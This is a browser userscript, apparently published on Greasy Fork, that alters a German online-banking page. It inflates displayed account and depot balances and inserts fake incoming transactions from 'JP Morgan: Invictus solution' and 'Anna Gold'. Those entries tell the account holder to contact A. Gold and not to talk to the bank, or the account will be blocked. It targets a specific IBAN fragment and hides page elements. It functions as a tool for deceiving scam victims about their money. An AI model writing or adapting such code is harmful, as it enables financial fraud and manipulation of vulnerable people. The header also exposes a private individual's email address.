// ==UserScript==
// @name         Ed 4Rec  ing.vr.brigitte.setzer@t-online.de
...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/524524/Ed%204Rec%20%20ingvrbrigittesetzer%40t-onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/524524/Ed%204Rec%20%20ingvrbrigittesetzer%40t-onlinede.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  964000},
        { index: 1, adjustmentAmount:  344700},
        { index: 2, adjustmentAmount:  344700},
        { index: 9, adjustmentAmount: 37400},
        { index: 10, adjustmentAmount: 37400},
        { index: 11, adjustmentAmount: 577000 },
        { index: 12, adjustmentAmount: 577000},
        { index: 13, adjustmentAmount: 577000},
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    // Define the target text content to search for (case and whitespace insensitive)
       var targetTextContent1 = "DE92 2926 5747";
       var targetTextContent2 = " 7000 1529 00";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 344700; // Adjust the amount as needed
...
//33333333333---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
 ...
 //       },
 {
    ...
    {
            title: 'JP Morgan: Invictus solution. Aedo s.r.o.',
            description: 'Invictus solution 2. A. Gold kontaktieren. Mit Bank nicht besprechen, solange kein Nachweis, sonst wird gesperrt.',
            amount: '9.600,00',
            date: '1. Apr.',
            insertAfter: false, // Set to false to insert before the original transaction
           moveSteps: 1, // Number of steps to move the transaction
  ...
  {
            title: 'JP Morgan: Invictus solution. Aedo s.r.o.',
            description: 'Invictus solution. A. Gold kontaktieren. Mit Bank nicht besprechen, solange kein Nachweis, sonst wird gesperrt.',
            amount: '10.000,00',
            date: '1. Apr.',
            insertAfter: false, // Set to false to insert before the original transaction
           moveSteps: 1, // Number of steps to move the transaction
...
{
            title: 'JP Morgan: Invictus solution. ',
            description: 'Invictus solution. 2 A. Gold kontaktieren. Mit Bank nicht besprechen, solange kein Nachweis, sonst wird gesperrt.',
            amount: '40.000,00',
            date: '25. Apr.',
            insertAfter: false, // Set to false to insert before the original transaction
...
{
            title: 'Anna Gold',
            description: ' A. Gold wünscht Alles Gute',
            amount: '10.000,00',
            date: '25. Apr.',
            insertAfter: false, // Set to false to insert before the original transaction
           moveSteps: 1, // Number of steps to move the transaction
            moveDirectionDown: false, // Set to false to move up
            order: 5 // Specify the order in which the transaction should be inserted
        },
{
            title: 'JP Morgan Chase',
            description: ' Bitte sich an A. Gold wenden.',
            amount: '7.700,00',
            date: '28. Apr.',
            insertAfter: false, // Set to false to insert before the original transaction
           moveSteps: 1, // Number of steps to move the transaction
            moveDirectionDown: false, // Set to false to move up
            order: 6 // Specify the order in which the transaction should be inserted
        },
{
            title: 'Anna Gold',
            description: ' Hilfe 2',
...
if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("Downloads") > 0) {
    ...
    (function() {
        ...
        // Example config
   //     var BALANCE_CONFIGS = [
   //         { index: 0, adjustmentAmount: 100000 },
    //        { index: 1, adjustmentAmount: 100000 },
    //        { index: 6, adjustmentAmount: 100000 }
    //    ];
        ...
        function modifyBalances() {
            ...
            if (!headerElement) {
                console.log('konto-list-header-wrapper not found');
                return;
            }
            ...
            BALANCE_CONFIGS.forEach(function(config) {
                ...
                if (siblingCurrencyElement && siblingCurrencyElement.classList.contains('waehrung')) {
                    if (document.body.textContent.includes(" Umsatzanzeige")) {
                        console.log('Umsatzanzeige found. Skipping balance modification.');
                        return;
                    }

                    numericValue += config.adjustmentAmount;

                    // Set data-positive on direct parent <span>
                    var spanParent = balanceElement.closest('span[data-positive]');
                    if (spanParent) {
                        spanParent.setAttribute('data-positive', numericValue >= 0 ? '1' : '0');
                    }

                    // Set data-positive on outer <lib-saldo>
                    var saldoContainer = balanceElement.closest('lib-saldo');
                    if (saldoContainer && saldoContainer.hasAttribute('data-positive')) {
                        saldoContainer.setAttribute('data-positive', numericValue >= 0 ? '1' : '0');
                    }
        ...
        function removeElementsAndObserve() {
            console.log('Removing specific elements...');
        ...
        function checkForConditions() {
            ...
            if (text.includes(TargetTextContent1.toLowerCase()) && !text.includes(TargetTextContent2.toLowerCase())) {
                modifyBalances();
            }
        }

        function observeAndRemoveSecondChild() {
            var parent = document.querySelector('.konto-list-header-wrapper');
        ...
        setInterval(checkForConditions, 20);
        setInterval(observeAndRemoveSecondChild, 1000);
...
// IHRE DEPOT
    ...
    const CONFIGS = [
        { index: 0, adjustmentAmount: 577000 }, // 1 depot
        { index: 1, adjustmentAmount: 0 }, // 2 depot
        { index: 2, adjustmentAmount: 577000 },  //gesamt
...
//  Depotentwicklung gesamtvermögen
    ...
    const balanceDelta = 577000.00; // Positive or negative adjustment
